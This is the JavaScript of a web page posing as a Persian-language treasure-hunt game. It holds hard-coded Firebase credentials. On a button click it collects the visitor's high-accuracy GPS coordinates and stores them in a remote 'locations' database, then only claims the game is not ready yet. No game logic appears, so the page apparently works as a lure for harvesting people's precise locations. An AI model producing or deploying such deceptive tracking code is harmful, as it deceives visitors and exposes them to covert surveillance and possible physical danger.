const firebaseConfig = {
    apiKey: "AIzaSyALODaXf0elRcIqQYABPd7Jamw8M3482LE",
    authDomain: "treasure-hunter-db822.firebaseapp.com",
    databaseURL: "https://treasure-hunter-db822-default-rtdb.firebaseio.com",
    projectId: "treasure-hunter-db822",
    storageBucket: "treasure-hunter-db822.firebasestorage.app",
    messagingSenderId: "658662293687",
    appId: "1:658662293687:web:a298ac3f313f390ed5cd32"
};

const firebaseApp = firebase.initializeApp(firebaseConfig);
const database = firebase.database();

database.ref("web_test").set({
    from: "GitHub Pages",
    time: Date.now()
})
.then(() => {
    console.log("🔥 FIREBASE WEB WRITE OK");
})
.catch((error) => {
    console.error("❌ FIREBASE WEB WRITE ERROR:", error);
});


const startBtn = document.getElementById("startBtn");
const status = document.getElementById("status");

startBtn.addEventListener("click", () => {
    if (!navigator.geolocation) {
        status.textContent = "موقعیت مکانی توسط این مرورگر پشتیبانی نمی‌شود.";
        return;
    }

    status.textContent = "درحال دریافت موقعیت...";

    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const data = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: Date.now()
            };

            try {
                await database.ref("locations").push(data);

                document.getElementById("lat").textContent =
                    data.latitude.toFixed(6);

                document.getElementById("lon").textContent =
                    data.longitude.toFixed(6);

                document.getElementById("accuracy").textContent =
                    `${Math.round(data.accuracy)} متر`;

                document.getElementById("locationBox")
                    .classList.remove("hidden");

                status.textContent = "موقعیت دریافت شد.";

                startBtn.disabled = true;
                startBtn.textContent = "🎮 ورود به بازی";

                startBtn.onclick = () => {
                    status.textContent =
                        "⚠️ بازی در حال آماده‌سازی است. لطفاً بعداً دوباره امتحان کنید.";
                };

            } catch (error) {
                console.error(error);
                status.textContent =
                    "خطا در ثبت موقعیت. لطفاً دوباره امتحان کنید.";
            }
        },
        (error) => {
            console.error(error);

            if (error.code === 1) {
                status.textContent =
                    "دسترسی موقعیت مکانی داده نشد.";
            } else {
                status.textContent =
                    "دریافت موقعیت ناموفق بود. دوباره تلاش کنید.";
            }
        },
        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }
    );
});
